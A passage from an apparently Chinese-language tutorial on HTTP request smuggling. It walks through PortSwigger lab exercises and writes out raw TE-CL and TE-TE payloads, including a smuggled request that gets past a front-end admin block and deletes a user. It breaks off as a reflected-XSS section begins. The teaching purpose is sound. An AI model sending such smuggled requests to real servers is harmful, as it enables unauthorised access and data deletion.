alt=\"在这里插入图片描述\"><br>此时由于<code>TE</code>读取到0就终止了，未读取<code>G</code>，<code>G</code>还在缓冲区，又来了一个请求，<code>G</code>就与这个请求相组合，变成了<code>GPOST</code>请求方式，此时就会报错，HTTP请求走私成功。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149600.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"TE-CL\"><a href=\"#TE-CL\" class=\"headerlink\" title=\"TE-CL\"></a>TE-CL</h3><p>所指情况如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>前端代理服务器采用的是<code>Transfer-Encoding</code><br>后端服务器采用的是<code>Content-Length</code></p></blockquote>\n<p>现有请求如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">4</span>\\r\\n\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\\r\\n\n\\r\\n\n<span class=\"token number\">12</span>\\r\\n\naPOST <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\n\\r\\n\n<span class=\"token number\">0</span>\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>前端服务器:接收的是<code>Transfer-Encoding: chunked\\r\\n</code>，当读取到第九行（第五块）时，读取到<code>0</code>前端服务器认为接收内容结束，没有什么问题，然后传给后端服务器</p>\n<p>后端服务器:接收的是<code>Content-Length: 4\\r\\n</code>，此时因为接收长度限定为4，<code>12</code>+<code>\\n</code>=4，所以它在读取完五六行后就不再读取。</p>\n<p>此时后面还有一些代码，即</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">aPOST <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\n\\r\\n\n<span class=\"token number\">0</span>\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时再来一个请求，他就会报错，客户端收到<code>Unrecognized method aPOST</code>类似的错误回显信息，请求走私攻击成功。</p>\n<h4 id=\"靶场演示-1\"><a href=\"#靶场演示-1\" class=\"headerlink\" title=\"靶场演示\"></a>靶场演示</h4><p>靶场地址如下<br><a href=\"https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl\">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>\n<p>开启环境后抓包，抓包后修改请求方式<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149627.png\" alt=\"在这里插入图片描述\"><br>接下来添加我们的恶意代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Content<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">4</span>\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\n\\r\\n\n<span class=\"token number\">12</span>\\r\\n\n<span class=\"token constant\">GPOST</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\n\\r\\n\n<span class=\"token number\">0</span>\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149744.png\" alt=\"在这里插入图片描述\"><br>第一次发包后回显正常，这个是因为<code>TE</code>在读取到<code>0</code>后休止，认为之前的数据也没什么问题，此时就会传入给后端服务器，后端服务器接收4个长度，这里的话也就是<code>12</code>+<code>\\n</code>=4,后面的因为存在<code>pipline</code>，所以会被认为是另一个独立的请求<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149759.png\" alt=\"在这里插入图片描述\"><br>此时再来一个新的请求，就会报错，请求走私攻击成功<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149770.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"TE-TE\"><a href=\"#TE-TE\" class=\"headerlink\" title=\"TE-TE\"></a>TE-TE</h3><p>所指情况如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>前端代理服务器和后端服务器所采用的都是<code>Transfer-Encoding</code>，但是在容错性上表现不同，例如当我们添加一个<code>Transfer-encoding</code>时，引起混淆，此时可能其中一个服务器会不采用<code>Transfer-Encoding</code>,此时就会导致请求走私</p></blockquote>\n<p>现有请求如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n\nContent<span class=\"token operator\">-</span>length<span class=\"token punctuation\">:</span> <span class=\"token number\">4</span>\\r\\n\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\\r\\n\nTransfer<span class=\"token operator\">-</span>encoding<span class=\"token punctuation\">:</span> cow\\r\\n\n\\r\\n\n<span class=\"token number\">5</span>c\\r\\n\naPOST <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">15</span>\\r\\n\n\\r\\n\nx<span class=\"token operator\">=</span><span class=\"token number\">1</span>\\r\\n\n<span class=\"token number\">0</span>\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>前端代理服务器:接收的是<code>Transfer-Encoding: chunked\\r\\n</code>,此时读取到最后<code>0</code>处，认为请求没有问题，将请求传输个后端服务器</p>\n<p>后端服务器：此时因为存在<code>Transfer-encoding</code>和<code>Transfer-Encoding</code>，对服务器起到了混淆作用，服务器不知道该接收哪个，此时可能会接收<code>Content-length: 4\\r\\n</code>，然后检测第七行，<code>5c</code>+<code>\\n</code>=4,认为结果没问题，然后不再读取(第六行不算长度，因为第六行是POST传数据需要空一行)</p>\n<p>此时还剩下几行代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">aPOST <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">15</span>\\r\\n\n\\r\\n\nx<span class=\"token operator\">=</span><span class=\"token number\">1</span>\\r\\n\n<span class=\"token number\">0</span>\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>因为存在<code>pipline</code>，所以被认为是一个单独的请求，此时就会给客户端回显<code>Unrecognized method aPOST</code>错误信息，请求走私攻击成功。</p>\n<h4 id=\"靶场演示-2\"><a href=\"#靶场演示-2\" class=\"headerlink\" title=\"靶场演示\"></a>靶场演示</h4><p>靶场地址如下<br><a href=\"https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header\">https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header</a><br>题目描述</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>本实验涉及前端和后端服务器，这两个服务器以不同的方式处理重复的 HTTP 请求标头。前端服务器拒绝不使用 GET 或 POST 方法的请求。</p></blockquote>\n<p>题目要求</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>解决实验室，偷偷向后端服务器发送一个请求，让后端服务器处理的下一个请求出现使用方法GPOST。</p></blockquote>\n<p>进入靶场后抓包，修改请求方法为POST方式<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149091.png\" alt=\"在这里插入图片描述\"><br>发送到重放模块，接下来添加我们的恶意代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Content<span class=\"token operator\">-</span>length<span class=\"token punctuation\">:</span> <span class=\"token number\">4</span>\\r\\n\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\\r\\n\nTransfer<span class=\"token operator\">-</span>encoding<span class=\"token punctuation\">:</span> cow\\r\\n\n\\r\\n\n<span class=\"token number\">5</span>c\\r\\n\n<span class=\"token constant\">GPOST</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\n\\r\\n\nx<span class=\"token operator\">=</span><span class=\"token number\">1</span>\\r\\n\n<span class=\"token number\">0</span>\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149225.png\" alt=\"在这里插入图片描述\"></p>\n<p>此时第一个访问正常，这个时候说明前端代理服务器采用的是<code>TE</code>，正常接收数据而后传送给后端服务器，而后端因为<code>TE</code>被混淆，且有<code>CL</code>，所以采用了CL，而此时<code>57</code>+<code>\\n</code>=4，所以后面的<code>GPOST</code>未进行读取，这个时候后面就会被当做单独请求来执行，当再一次请求时，就会将错误返回出来，成功执行HTTP请求走私。</p>\n<h1 id=\"常见攻击面\"><a href=\"#常见攻击面\" class=\"headerlink\" title=\"常见攻击面\"></a>常见攻击面</h1><h2 id=\"绕过前端安全控制\"><a href=\"#绕过前端安全控制\" class=\"headerlink\" title=\"绕过前端安全控制\"></a>绕过前端安全控制</h2><p>这里用一道靶场题目来对其进行简单讲解。</p>\n<p>题目描述</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>本实验涉及前端和后端服务器，前端服务器不支持分块编码。有一个管理面板/admin，但前端服务器阻止访问它。</p></blockquote>\n<p>题目要求</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>要解决实验室问题，请向访问管理面板并删除用户的后端服务器发送请求carlos。</p></blockquote>\n<p>进入靶场后,尝试直接访问他的admin界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149202.png\" alt=\"在这里插入图片描述\"><br>发现此时存在防护，是不允许访问此界面的。<br>此时我们抓包，修改请求方式，接下来添加我们的恶意数据,尝试利用请求走私去访问admin界面</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Content<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">30</span>\\r\\n\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\\r\\n\n\\r\\n  \n<span class=\"token number\">0</span>\\r\\n\n\\r\\n\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>admin <span class=\"token constant\">HTTP</span> <span class=\"token number\">1.1</span>\\r\\n\n\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里简单提一下他的CT长度计算</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Content<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">30</span>\\r\\n\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\\r\\n\n\\r\\n   <span class=\"token comment\">//POST发包需要有一行换行，这个不作为长度计算</span>\n<span class=\"token number\">0</span>\\r\\n <span class=\"token comment\">//0加上换行符\\n，长度为3</span>\n\\r\\n  <span class=\"token comment\">//只有一个换行符，长度为2</span>\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>admin <span class=\"token constant\">HTTP</span> <span class=\"token number\">1.1</span>\\r\\n <span class=\"token comment\">//前面字符为19，后面还有换行符，所以一共长度为19+2=21</span>\n\\r\\n <span class=\"token comment\">//只有一个换行符，长度为2</span>\n\\r\\n <span class=\"token comment\">//只有一个换行符，长度为2</span>\n<span class=\"token comment\">//所以CT长度就是3+2+21+2+2=30</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时还有一点，就是初始的<code>Connection</code>，是<code>close</code>，我们这里需要修改为<code>keep-alive</code>，这样才可以实现重用TCP链接，使得请求走私攻击成功<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149324.png\" alt=\"在这里插入图片描述\"><br>此时我们发现新的回显</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Admin <span class=\"token keyword\">interface</span> <span class=\"token class-name-definition class-name\">only</span> available to local users<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>大概意思就是只有本地用户才可以登录，那我们就添加一个<code>Host: 127.0.0.1</code>来伪装一下本地用户<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149370.png\" alt=\"在这里插入图片描述\"><br>此时发现删除用户的接口，那我们就尝试来构造一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Connection<span class=\"token punctuation\">:</span> keep<span class=\"token operator\">-</span>alive\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">70</span>\\r\\n\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\\r\\n\n\\r\\n\n<span class=\"token number\">0</span>\\r\\n\n\\r\\n\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>admin<span class=\"token operator\">/</span>delete<span class=\"token operator\">?</span>username<span class=\"token operator\">=</span>carlos <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n\n\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149402.png\" alt=\"在这里插入图片描述\"><br>请求走私攻击成功，成功删除了一个用户</p>\n<h2 id=\"请求走私引发反射型XSS\"><a href=\"#请求走私引发反射型XSS\" class=\"headerlink\" title=\"请求走私引发反射型XSS\"></a>请求走私引发反射型XSS</h2><p>单个的UA处的xss并没有什么危害，但当我们将它与请求走私相结合时，就可以导致其他用户访问任意界面出现反射型xss，对客户端和网页有一定影响，接下来尝试一下</p>\n<p>所用靶场<br><a href=\"https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss\">https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</a><br>题目描述</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 